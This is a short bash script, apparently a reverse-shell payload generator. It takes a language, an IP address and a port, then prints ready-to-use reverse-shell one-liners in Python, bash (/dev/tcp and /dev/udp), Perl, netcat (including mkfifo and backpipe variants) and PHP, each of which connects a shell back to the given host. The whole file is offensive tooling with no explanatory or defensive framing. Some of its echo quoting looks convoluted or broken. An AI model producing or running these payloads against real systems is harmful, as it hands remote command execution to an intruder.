#!/bin/bash
if [[ -z $3 ]];
then
	echo "Usage: $0 <Language> <Ip> <Port>"
else
	if [[ $1 == "Python" || $1 == "python" ]];
		then
			echo '"'">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$2",$3));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"'"'
			echo '"'">python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$2",$3));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'"'"'
	fi
	if [[ $1 == "bash" || $1 == "Bash" ]];
		then
			echo "sh -i >& /dev/tcp/$2/$3 0>&1"
			echo "0<&196;exec 196<>/dev/tcp/$2/$3; sh <&196 >&196 2>&196"
			echo "sh -i 5<> /dev/tcp/$2/$3 0<&5 1>&5 2>&5"
			echo "sh -i >& /dev/udp/$2/$3 0>&1"
	fi
	if [[ $1 == "Perl" || $1 == "perl" ]];
		then
			echo "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$2:$3");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
	fi
	if [[ $1 == "nc" || $1 == "Nc" || $1 == "Netcat" || $1 == "netcat" ]];
		then
			echo "nc -e /bin/sh $2 $3"
			echo "mknod backpipe p && nc $2 $3 0<backpipe | /bin/sh 1>backpipe"
			echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $2 $3 >/tmp/f"
	fi
	if [[ $1 == "php" || $1 == "Php" ]]
		then
			echo "'"'php -r ''$'sock=fsockopen'('"$2",$3')'';'exec'('"/bin/sh -i <&3 >&3 2>&3"')'';''"'"'"
	fi
fi